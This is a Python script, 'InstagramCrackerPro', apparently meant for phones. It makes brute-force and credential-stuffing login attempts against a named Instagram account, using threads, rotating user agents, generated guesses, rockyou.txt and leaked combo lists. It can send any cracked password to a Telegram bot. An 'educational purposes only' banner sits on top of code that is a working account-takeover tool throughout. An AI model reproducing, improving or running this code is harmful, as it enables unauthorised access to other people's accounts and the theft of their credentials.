#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import random
import os
import time
import threading
import queue
import concurrent.futures
import sys
import json
from datetime import datetime

# Color codes for terminal output (Android/Pydroid compatible)
skali = '\033[1;31m'
Smart = '\033[1;33m'
Hu = '\033[1;32m'
E = '\033[1;31m'
Kali = '\033[1;33m'
F = '\033[2;32m'
Ca = "\033[1;97m"
B = '\033[2;36m'
Y = '\033[1;34m'
y = '\033[1;35m'
f = '\033[2;35m'
K = '\033[3;33m'

class InstagramCrackerPro:
    def __init__(self):
        self.sessions = {}
        self.proxies = []
        self.user_agents = self.generate_user_agents()
        self.passwords_queue = queue.Queue()
        self.found = False
        self.attempts = 0
        self.success_password = None
        self.lock = threading.Lock()
        self.max_workers = 30  # Reduced for mobile performance
        self.active_threads = 0
        
    def generate_user_agents(self):
        """Generate user agents without external library"""
        agents = [
            'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Instagram 219.0.0.12.117 Android',
            'Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
        ]
        
        # Generate additional random agents for variety
        for _ in range(100):
            android_version = random.randint(8, 12)
            chrome_version = f"{random.randint(85, 95)}.0.{random.randint(4000, 5000)}.{random.randint(100, 200)}"
            agent = f'Mozilla/5.0 (Linux; Android {android_version}; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36'
            agents.append(agent)
        
        return agents
    
    def clear_screen(self):
        """Clear screen compatible with Pydroid 3"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        """Display optimized banner for mobile"""
        banner = f"""{skali}
 .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. |
| |  _________   | || |     ____     | || |  ____  ____  | |
| | |_   ___  |  | || |   .'    `.   | || | |_  _||_  _| | |
| |   | |_  \_|  | || |  /  .--.  \  | || |   \ \  / /   | |
| |   |  _|      | || |  | |    | |  | || |    > `' <    | |
| |  _| |_       | || |  \  `--'  /  | || |  _/ /'`\ \_  | |
| | |_____|      | || |   `.____.'   | || | |____||____| | |
| |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------' 

"""
        print(banner)
    
    def print_mobile_menu(self):
        """Simplified menu for mobile display"""
        menu = f"""
{Kali}╔══════════════════════════════╗
{Kali}║  {Ca}MOBILE ATTACK METHODS     {Kali}║
{Kali}╠══════════════════════════════╣
{Kali}║ {Ca}1. {Hu}Quick Scan              {Kali}║
{Kali}║ {Ca}2. {Hu}File Password List      {Kali}║
{Kali}║ {Ca}3. {Hu}Built-in Lists          {Kali}║
{Kali}║ {Ca}4. {Hu}Smart Dictionary        {Kali}║
{Kali}║ {Ca}5. {Hu}Multi-Thread            {Kali}║
{Kali}║ {Ca}6. {Hu}Proxy Attack            {Kali}║
{Kali}║ {Ca}7. {Hu}Combo List              {Kali}║
{Kali}║ {Ca}8. {Hu}Ultimate Mode           {Kali}║
{Kali}║ {Ca}9. {Hu}Settings                {Kali}║
{Kali}║ {Ca}0. {Hu}Exit                    {Kali}║
{Kali}╚══════════════════════════════╝
"""
        print(menu)
    
    def progress_bar(self, progress, total, length=30):
        """Simplified progress bar for mobile"""
        percent = progress / total if total > 0 else 0
        filled = int(length * percent)
        bar = f"{Hu}█" * filled + f"{skali}░" * (length - filled)
        return f"{Ca}[{bar}] {int(percent*100)}%"
    
    def load_proxies_mobile(self):
        """Load proxies with mobile-friendly options"""
        print(f"\n{Smart}Proxy Options:")
        print(f"{Ca}1. No proxies (direct connection)")
        print(f"{Ca}2. Load from file")
        print(f"{Ca}3. Use mobile data (default)")
        
        choice = input(f"\n{Smart}Select: {Hu}")
        
        if choice == '2':
            proxy_file = input(f"{Ca}Proxy file path: {Hu}")
            try:
                with open(proxy_file, 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                print(f"{Hu}[+] Loaded {len(self.proxies)} proxies")
            except:
                print(f"{E}[-] Error loading proxies")
                self.proxies = []
        else:
            self.proxies = []
    
    def get_random_user_agent(self):
        """Get random user agent"""
        return random.choice(self.user_agents) if self.user_agents else "Instagram 219.0.0.12.117 Android"
    
    def try_login_mobile(self, username, password, token=None, user_id=None):
        """Optimized login attempt for mobile"""
        if self.found:
            return False
        
        with self.lock:
            self.attempts += 1
            current_attempt = self.attempts
        
        # Simple mobile-optimized headers
        user_agent = self.get_random_user_agent()
        
        headers = {
            'User-Agent': user_agent,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
            'X-Requested-With': 'XMLHttpRequest',
        }
        
        # Simple session (no proxies for mobile stability)
        session = requests.Session()
        
        try:
            # Get initial page for cookies
            session.get('https://www.instagram.com/', headers=headers, timeout=10)
            
            # Prepare login data
            timestamp = int(time.time())
            enc_password = f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}'
            
            data = {
                'username': username,
                'enc_password': enc_password,
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            # Mobile-optimized timeout
            response = session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                headers=headers,
                data=data,
                timeout=15
            )
            
            if response.status_code == 200:
                try:
                    result = response.json()
                    if result.get('authenticated') and result.get('status') == 'ok':
                        with self.lock:
                            self.found = True
                            self.success_password = password
                        
                        print(f"\n\n{F}╔══════════════════════════════════════╗")
                        print(f"{F}║          ACCOUNT COMPROMISED!        ║")
                        print(f"{F}╠══════════════════════════════════════╣")
                        print(f"{Ca} Username: {Hu}{username}")
                        print(f"{Ca} Password: {Hu}{password}")
                        print(f"{Ca} Attempts: {Hu}{current_attempt}")
                        print(f"{Ca} Time: {Hu}{datetime.now().strftime('%H:%M:%S')}")
                        print(f"{F}╚══════════════════════════════════════╝")
                        
                        # Send notification if Telegram info provided
                        if token and user_id:
                            self.send_telegram_notification(token, user_id, username, password, current_attempt)
                        
                        return True
                except:
                    pass
            
            # Rate limit handling
            if response.status_code == 429:
                time.sleep(random.uniform(2, 5))
                
        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            pass
        
        return False
    
    def send_telegram_notification(self, token, user_id, username, password, attempts):
        """Send notification via Telegram"""
        try:
            message = (
                f"🔓 Instagram Account Found!\n\n"
                f"👤 User: {username}\n"
                f"🔑 Pass: {password}\n"
                f"🎯 Attempts: {attempts}\n"
                f"📱 Device: Pydroid 3\n"
                f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            data = {
                'chat_id': user_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            
            requests.post(url, data=data, timeout=10)
            print(f"{Hu}[+] Telegram notification sent!")
        except:
            pass
    
    def load_password_file_mobile(self, filepath):
        """Load passwords from file with mobile optimizations"""
        passwords = []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    pwd = line.strip()
                    if pwd and len(pwd) >= 4:  # Filter very short passwords
                        passwords.append(pwd)
            
            print(f"{Hu}[+] Loaded {len(passwords)} passwords")
            return passwords[:10000]  # Limit for mobile memory
            
        except Exception as e:
            print(f"{E}[-] Error: {str(e)}")
            return []
    
    def generate_smart_passwords(self, username):
        """Generate smart password combinations"""
        passwords = []
        
        # Common passwords
        common = [
            '123456', 'password', '123456789', '12345678', '12345',
            '1234567', '1234567890', 'qwerty', 'abc123', 'password1',
            '123123', 'admin', 'welcome', 'monkey', 'letmein',
            'instagram', 'love', 'hello', 'secret', 'iloveyou'
        ]
        
        passwords.extend(common)
        
        # Username variations
        passwords.extend([
            username,
            username + '123',
            username + '1234',
            username + '12345',
            username + '123456',
            username + '!',
            username + '@',
            username + '2024',
            username + '2023',
            username + '2022',
            '123' + username,
        ])
        
        # Year combinations
        for year in range(1990, 2025):
            passwords.extend([
                str(year),
                username + str(year),
                'password' + str(year),
                'pass' + str(year),
                str(year) + username,
            ])
        
        # Simple patterns
        patterns = ['123', '456', '789', '000', '111', '222', '333']
        for pattern in patterns:
            passwords.extend([
                username + pattern,
                pattern + username,
                'pass' + pattern,
                pattern + 'pass',
            ])
        
        return list(set(passwords))  # Remove duplicates
    
    def quick_scan(self, username):
        """Quick scan with common passwords"""
        print(f"\n{Smart}[*] Starting Quick Scan...")
        
        passwords = self.generate_smart_passwords(username)
        print(f"{Ca} Testing {Hu}{len(passwords)} {Ca}common passwords")
        
        return self.run_single_thread_scan(username, passwords)
    
    def run_single_thread_scan(self, username, passwords, token=None, user_id=None):
        """Single-threaded scan for mobile stability"""
        self.found = False
        self.attempts = 0
        start_time = time.time()
        
        for i, password in enumerate(passwords):
            if self.found:
                break
            
            # Show progress every 10 attempts
            if i % 10 == 0:
                progress = self.progress_bar(i, len(passwords))
                print(f"\r{progress} | {Ca}Testing: {Hu}{password[:15]}...", end='', flush=True)
            
            if self.try_login_mobile(username, password, token, user_id):
                return True
            
            # Small delay to avoid rate limiting
            time.sleep(0.1)
        
        elapsed = time.time() - start_time
        print(f"\n\n{Smart}[*] Scan completed in {elapsed:.1f}s")
        print(f"{Ca} Total attempts: {Hu}{self.attempts}")
        
        return self.found
    
    def multi_thread_scan_mobile(self, username, passwords, token=None, user_id=None):
        """Mobile-optimized multi-threading"""
        self.found = False
        self.attempts = 0
        self.active_threads = 0
        
        # Queue all passwords
        for pwd in passwords:
            self.passwords_queue.put(pwd)
        
        total = len(passwords)
        start_time = time.time()
        
        print(f"\n{Smart}[*] Starting {self.max_workers} threads...")
        print(f"{Ca} Total passwords: {Hu}{total}")
        
        # Thread pool with mobile optimization
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            # Submit initial batch
            for _ in range(min(self.max_workers * 2, total)):
                if not self.passwords_queue.empty():
                    password = self.passwords_queue.get()
                    future = executor.submit(
                        self.try_login_mobile,
                        username, password, token, user_id
                    )
                    futures.append(future)
            
            # Monitor progress
            completed = 0
            while not self.found and completed < total:
                completed = sum(1 for f in futures if f.done())
                elapsed = time.time() - start_time
                speed = completed / elapsed if elapsed > 0 else 0
                
                print(f"\r{self.progress_bar(completed, total)} | "
                      f"{Ca}Speed: {Hu}{speed:.1f}/s | "
                      f"{Ca}Elapsed: {Hu}{elapsed:.1f}s", end='', flush=True)
                
                # Submit more tasks as threads complete
                while len([f for f in futures if not f.done()]) < self.max_workers * 2:
                    if not self.passwords_queue.empty() and not self.found:
                        password = self.passwords_queue.get()
                        future = executor.submit(
                            self.try_login_mobile,
                            username, password, token, user_id
                        )
                        futures.append(future)
                    else:
                        break
                
                time.sleep(0.1)
        
        elapsed = time.time() - start_time
        print(f"\n\n{Smart}[*] Scan completed in {elapsed:.1f}s")
        print(f"{Ca} Total attempts: {Hu}{self.attempts}")
        
        return self.found
    
    def setup_telegram(self):
        """Setup Telegram notifications"""
        print(f"\n{Smart}Telegram Notification Setup")
        print(f"{Ca}Leave blank to skip")
        
        token = input(f"{Ca}Bot Token: {Hu}").strip()
        user_id = input(f"{Ca}User ID: {Hu}").strip()
        
        return token, user_id
    
    def run(self):
        """Main mobile-optimized runner"""
        self.clear_screen()
        self.print_banner()
        
        # Display warning
        print(f"{Kali}╔══════════════════════════════════════════╗")
        print(f"{Kali}║  {Ca}⚠️  FOR EDUCATIONAL PURPOSES ONLY!   {Kali}║")
        print(f"{Kali}║  {Ca}⚠️  USE ONLY ON ACCOUNTS YOU OWN     {Kali}║")
        print(f"{Kali}╚══════════════════════════════════════════╝\n")
        
        input(f"{Smart}Press Enter to continue...{Hu}")
        
        # Get target
        self.clear_screen()
        self.print_banner()
        
        target = input(f"\n{Smart}Target username (@ بدون): {Hu}").strip()
        
        # Telegram setup
        token, user_id = self.setup_telegram()
        
        # Proxy setup
        self.load_proxies_mobile()
        
        while True:
            self.clear_screen()
            self.print_banner()
            self.print_mobile_menu()
            
            choice = input(f"\n{Smart}Select option (0-9): {Hu}").strip()
            
            if choice == '0':
                print(f"\n{Smart}[*] Exiting...")
                break
            
            elif choice == '1':  # Quick Scan
                self.quick_scan(target)
                
            elif choice == '2':  # File List
                filepath = input(f"{Ca}Password file path: {Hu}").strip()
                if os.path.exists(filepath):
                    passwords = self.load_password_file_mobile(filepath)
                    if passwords:
                        self.run_single_thread_scan(target, passwords, token, user_id)
                else:
                    print(f"{E}[-] File not found!")
            
            elif choice == '3':  # Built-in Lists
                print(f"\n{Smart}Available lists:")
                lists = ['rockyou.txt', 'passwords.txt', 'wordlist.txt', 'common.txt']
                for i, lst in enumerate(lists, 1):
                    if os.path.exists(lst):
                        print(f"{Ca}{i}. {Hu}{lst} {Ca}(Found)")
                    else:
                        print(f"{Ca}{i}. {E}{lst} {Ca}(Not found)")
                
                list_choice = input(f"\n{Smart}Select list: {Hu}").strip()
                if list_choice.isdigit() and int(list_choice) <= len(lists):
                    filename = lists[int(list_choice)-1]
                    if os.path.exists(filename):
                        passwords = self.load_password_file_mobile(filename)
                        if passwords:
                            self.run_single_thread_scan(target, passwords, token, user_id)
            
            elif choice == '4':  # Smart Dictionary
                print(f"\n{Smart}[*] Generating smart dictionary...")
                passwords = self.generate_smart_passwords(target)
                print(f"{Ca} Generated {Hu}{len(passwords)} {Ca}smart combinations")
                
                use_threads = input(f"{Ca}Use multi-thread? (y/n): {Hu}").lower() == 'y'
                if use_threads:
                    self.multi_thread_scan_mobile(target, passwords, token, user_id)
                else:
                    self.run_single_thread_scan(target, passwords, token, user_id)
            
            elif choice == '5':  # Multi-Thread
                threads = input(f"{Ca}Threads (1-30): {Hu}").strip()
                if threads.isdigit():
                    self.max_workers = min(int(threads), 30)
                
                print(f"\n{Smart}[*] Enter passwords (type 'done' when finished):")
                passwords = []
                while True:
                    pwd = input(f"{Ca}Password: {Hu}").strip()
                    if pwd.lower() == 'done':
                        break
                    if pwd:
                        passwords.append(pwd)
                
                if passwords:
                    self.multi_thread_scan_mobile(target, passwords, token, user_id)
            
            elif choice == '6':  # Proxy Attack
                print(f"\n{Smart}[*] Proxy Attack Mode")
                if not self.proxies:
                    print(f"{E}[-] No proxies loaded!")
                else:
                    passwords = self.generate_smart_passwords(target)
                    self.multi_thread_scan_mobile(target, passwords[:1000], token, user_id)
            
            elif choice == '7':  # Combo List
                print(f"\n{Smart}Combo List Format: username:password")
                filepath = input(f"{Ca}Combo file: {Hu}").strip()
                
                if os.path.exists(filepath):
                    combos = []
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            if ':' in line:
                                user, pwd = line.strip().split(':', 1)
                                if user.lower() == target.lower():
                                    combos.append(pwd)
                    
                    if combos:
                        print(f"{Hu}[+] Found {len(combos)} passwords for {target}")
                        self.run_single_thread_scan(target, combos, token, user_id)
                    else:
                        print(f"{E}[-] No passwords found for {target}")
                else:
                    print(f"{E}[-] File not found!")
            
            elif choice == '8':  # Ultimate Mode
                print(f"\n{Smart}[*] ULTIMATE MODE ACTIVATED!")
                print(f"{Ca} This will use all available methods")
                
                # Combine all password sources
                all_passwords = set()
                
                # Smart dictionary
                all_passwords.update(self.generate_smart_passwords(target))
                
                # Check for common files
                common_files = ['rockyou.txt', 'passwords.txt', 'wordlist.txt']
                for file in common_files:
                    if os.path.exists(file):
                        try:
                            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                                for line in f:
                                    all_passwords.add(line.strip())
                        except:
                            pass
                
                # Convert to list
                passwords = list(all_passwords)[:20000]  # Limit for mobile
                
                print(f"{Hu}[+] Ultimate dictionary: {len(passwords)} passwords")
                print(f"{Ca}[*] Starting comprehensive attack...")
                
                self.max_workers = 20
                self.multi_thread_scan_mobile(target, passwords, token, user_id)
            
            elif choice == '9':  # Settings
                print(f"\n{Smart}SETTINGS")
                print(f"{Ca}1. Change max threads (current: {self.max_workers})")
                print(f"{Ca}2. Clear all data")
                print(f"{Ca}3. Back")
                
                setting = input(f"\n{Smart}Select: {Hu}")
                if setting == '1':
                    threads = input(f"{Ca}New thread count (1-30): {Hu}")
                    if threads.isdigit():
                        self.max_workers = min(max(1, int(threads)), 30)
                        print(f"{Hu}[+] Threads set to {self.max_workers}")
            
            else:
                print(f"{E}[-] Invalid choice!")
            
            # Ask to continue
            if not self.found:
                print(f"\n{Smart}{'='*40}")
                continue_scan = input(f"{Ca}Scan again? (y/n): {Hu}").lower()
                if continue_scan != 'y':
                    break
            else:
                print(f"\n{F}[+] Success! Password found for {target}")
                break
            
            time.sleep(1)

def main():
    """Main entry point optimized for Pydroid 3"""
    try:
        print(f"{Smart}[*] Starting Instagram Security Scanner...")
        print(f"{Ca}[*] Optimized for Pydroid 3")
        print(f"{Ca}[*] Loading modules...")
        
        scanner = InstagramCrackerPro()
        scanner.run()
        
    except KeyboardInterrupt:
        print(f"\n{E}[!] Stopped by user")
    except Exception as e:
        print(f"\n{E}[!] Error: {str(e)}")
        print(f"{Ca}[*] Please check your internet connection")
    
    print(f"\n{Smart}[*] Thank you for using!")
    time.sleep(2)

if __name__ == "__main__":
    main()